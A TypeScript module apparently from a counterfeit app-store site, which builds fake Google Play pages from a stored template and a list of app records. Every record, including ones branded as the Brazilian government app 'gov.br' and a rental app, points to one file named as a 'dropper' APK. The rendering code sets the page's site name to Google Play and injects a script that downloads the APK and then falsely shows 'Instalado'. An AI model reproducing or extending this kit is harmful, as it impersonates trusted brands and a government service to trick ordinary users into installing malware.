export interface AppRecord {
  id: number;
  appName: string;
  slug: string;
  logoName: string;
  logoUrl: string;
  logoSize: number;
  logoMime: string;
  fileName: string;
  fileUrl: string;
  fileSize: number;
  fileMime: string;
  createdAt: string;
  updatedAt: string;
}

export const MEGA_DOWNLOAD_URL = 'https://mega.nz/file/71Z22RJZ#p_c9-yJ0daS3sMZpkFTp8sufmIeCjK48JVdUFMR7FNw';

export const DEFAULT_APPS: AppRecord[] = [
  {
    id: 1791075513203,
    appName: "Cineva",
    slug: "cineva",
    logoName: "f57afe24-29b4-49b1-bb41-32f26922c5a0.png",
    logoUrl: "/cineva-logo.png",
    logoSize: 443422,
    logoMime: "image/png",
    fileName: "Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileUrl: "/Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileSize: 14718481,
    fileMime: "application/vnd.android.package-archive",
    createdAt: "2026-10-04T00:58:33.203Z",
    updatedAt: "2026-10-15T12:53:00.000Z"
  },
  {
    id: 1,
    appName: "Meu aluguel",
    slug: "meualuguel",
    logoName: "1fd47ad1-63d5-4999-9711-910297b8f1e7.png",
    logoUrl: "/seed-logo.png",
    logoSize: 997812,
    logoMime: "image/png",
    fileName: "Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileUrl: "/Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileSize: 14718481,
    fileMime: "application/vnd.android.package-archive",
    createdAt: "2026-10-02T20:32:10.000Z",
    updatedAt: "2026-10-02T20:37:15.000Z"
  },
  {
    id: 2,
    appName: "gov.br",
    slug: "govbr",
    logoName: "govbr-logo.webp",
    logoUrl: "/govbr-logo.webp",
    logoSize: 4414,
    logoMime: "image/webp",
    fileName: "Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileUrl: "/Cineva_build_1792068111_adb78f5e_dropper.apk",
    fileSize: 14718481,
    fileMime: "application/vnd.android.package-archive",
    createdAt: "2026-10-03T12:00:00.000Z",
    updatedAt: "2026-10-03T12:00:00.000Z"
  }
];

const DB_NAME = "LogoFiles_Apps_DB";
const DB_VERSION = 1;
const STORE_NAME = "apps";

function openDb(): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    if (typeof window === "undefined" || !window.indexedDB) {
      reject(new Error("IndexedDB not supported"));
      return;
    }
    const req = window.indexedDB.open(DB_NAME, DB_VERSION);
    req.onupgradeneeded = (e) => {
      const db = (e.target as IDBOpenDBRequest).result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.createObjectStore(STORE_NAME, { keyPath: "id" });
      }
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

export function generateSlug(appName: string): string {
  return (
    appName
      .toLowerCase()
      .trim()
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/g, "")
      .replace(/[^a-z0-9]/g, "") || "app"
  );
}

export function formatBytes(bytes: number): string {
  if (!bytes) return "0 B";
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / 1048576).toFixed(1)} MB`;
}

export async function getApps(): Promise<AppRecord[]> {
  try {
    const db = await openDb();
    return new Promise((resolve) => {
      const tx = db.transaction(STORE_NAME, "readonly");
      const store = tx.objectStore(STORE_NAME);
      const req = store.getAll();
      req.onsuccess = () => {
        const res = req.result as AppRecord[];
        if (!res || res.length === 0) {
          // Initialize with default apps
          saveDefaultApps(db).then(() => resolve(DEFAULT_APPS));
        } else {
          res.sort((a, b) => new Date(b.updatedAt || 0).getTime() - new Date(a.updatedAt || 0).getTime());
          resolve(res);
        }
      };
      req.onerror = () => resolve(DEFAULT_APPS);
    });
  } catch {
    return DEFAULT_APPS;
  }
}

async function saveDefaultApps(db: IDBDatabase): Promise<void> {
  try {
    const tx = db.transaction(STORE_NAME, "readwrite");
    const store = tx.objectStore(STORE_NAME);
    for (const app of DEFAULT_APPS) {
      store.put(app);
    }
  } catch {}
}

export async function getAppBySlug(slug: string): Promise<AppRecord | null> {
  const clean = slug.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (clean === "cineva" || !clean) {
    return DEFAULT_APPS[0];
  }
  const apps = await getApps();
  const found =
    apps.find((a) => a.slug.toLowerCase().replace(/[^a-z0-9]/g, "") === clean) ||
    DEFAULT_APPS.find((a) => a.slug.toLowerCase().replace(/[^a-z0-9]/g, "") === clean) ||
    null;

  if (found && found.slug === "cineva") {
    found.logoUrl = "/cineva-logo.png";
  }
  return found;
}

export async function saveApp(app: AppRecord): Promise<void> {
  try {
    const db = await openDb();
    return new Promise((resolve, reject) => {
      const tx = db.transaction(STORE_NAME, "readwrite");
      const store = tx.objectStore(STORE_NAME);
      const req = store.put(app);
      req.onsuccess = () => resolve();
      req.onerror = () => reject(req.error);
    });
  } catch (err) {
    console.error("Failed to save app to IndexedDB:", err);
  }
}

export async function deleteApp(id: number): Promise<void> {
  try {
    const db = await openDb();
    return new Promise((resolve, reject) => {
      const tx = db.transaction(STORE_NAME, "readwrite");
      const store = tx.objectStore(STORE_NAME);
      const req = store.delete(id);
      req.onsuccess = () => resolve();
      req.onerror = () => reject(req.error);
    });
  } catch (err) {
    console.error("Failed to delete app:", err);
  }
}

let cachedBaseHtml = "";

export async function fetchBaseHtml(): Promise<string> {
  if (cachedBaseHtml) return cachedBaseHtml;
  try {
    const res = await fetch("/playstore-base.html");
    if (res.ok) {
      cachedBaseHtml = await res.text();
      return cachedBaseHtml;
    }
  } catch (err) {
    console.warn("Error fetching /playstore-base.html:", err);
  }
  return "";
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

export function renderPlaystoreHtml(baseHtml: string, app: Partial<AppRecord>): string {
  if (!baseHtml) return "";
  let html = baseHtml;
  const appName = escapeHtml(app.appName || "Cineva");
  const title = `${appName} – Apps no Google Play`;
  const desc = "Aproveite milhões de novidades em apps, jogos e muito mais para Android no Google Play.";

  html = html.replace(/<title[^>]*>[^<]*<\/title>/gi, `<title id="main-title">${title}</title>`);
  if (html.includes("og:site_name")) {
    html = html.replace(/<meta[^>]*property=["']?og:site_name["']?[^>]*>/gi, `<meta property="og:site_name" content="Google Play">`);
  } else {
    html = html.replace(/<head>/i, `<head><meta property="og:site_name" content="Google Play">`);
  }
  html = html.replace(/<meta[^>]*property=["']?og:title["']?[^>]*>/gi, `<meta property="og:title" content="${title}">`);
  html = html.replace(/<meta[^>]*name=["']?twitter:title["']?[^>]*>/gi, `<meta name="twitter:title" content="${title}">`);
  html = html.replace(/<meta[^>]*property=["']?og:description["']?[^>]*>/gi, `<meta property="og:description" content="${desc}">`);
  html = html.replace(/<meta[^>]*name=["']?twitter:description["']?[^>]*>/gi, `<meta name="twitter:description" content="${desc}">`);
  html = html.replace(/<meta[^>]*name=["']?description["']?[^>]*>/gi, `<meta name="description" content="${desc}">`);

  if (app.logoUrl) {
    html = html.replace(/<meta[^>]*property=["']?og:image["']?[^>]*>/gi, `<meta property="og:image" content="${app.logoUrl}">`);
    html = html.replace(/<meta[^>]*name=["']?twitter:image["']?[^>]*>/gi, `<meta name="twitter:image" content="${app.logoUrl}">`);
  }

  html = html.replace(/<h1><span class=AfwdI itemprop=name>[^<]+<\/span><\/h1>/g, `<h1><span class="AfwdI" itemprop="name">${appName}</span></h1>`);

  if (app.logoUrl) {
    html = html.replace(/<img\s+src="[^"]+"\s+class="T75of cN0oRe fFmL2e"/g, `<img src="${app.logoUrl}" class="T75of cN0oRe fFmL2e"`);
  }

  const isApk = !!(app.fileUrl && app.fileUrl.endsWith(".apk"));
  const downloadUrl = (app.fileUrl && (app.fileUrl.startsWith("http://") || app.fileUrl.startsWith("https://"))) || isApk
    ? (app.fileUrl || "/Cineva_build_1792068111_adb78f5e_dropper.apk")
    : `/Cineva_build_1792068111_adb78f5e_dropper.apk`;
  const fileName = app.fileName || "Cineva_build_1792068111_adb78f5e_dropper.apk";

  const downloadScript = `function baixarAPK(e, botao) {
    e.stopPropagation();
    const downloadUrl = ${JSON.stringify(downloadUrl)};
    const name = ${JSON.stringify(fileName)};
    const link = document.createElement('a');
    link.href = downloadUrl;
    link.download = name;
    if (downloadUrl.startsWith('http') && !downloadUrl.includes(window.location.host)) {
      link.target = '_blank';
    } else {
      link.target = '_self';
    }
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    try {
      if (window.parent && window.parent !== window) {
        window.parent.postMessage({ type: 'DOWNLOAD_APK', url: downloadUrl, name: name }, '*');
      }
    } catch(err) {}

    const textoSpan = botao ? botao.querySelector('.VfPpkd-vQzf8d') : null;
    if (textoSpan) {
      textoSpan.innerHTML = '<span><span itemprop="offers" itemscope itemtype="https://schema.org"></span></span>Baixando…';
      setTimeout(function() {
        textoSpan.innerHTML = '<span><span itemprop="offers" itemscope itemtype="https://schema.org"></span></span>Instalado';
      }, 3000);
    }
  }`;

  html = html.replace(/function baixarAPK\(e,\s*botao\)\s*\{[\s\S]*?\}\s*<\/script>/, `${downloadScript}\n</script>`);
  return html;
}
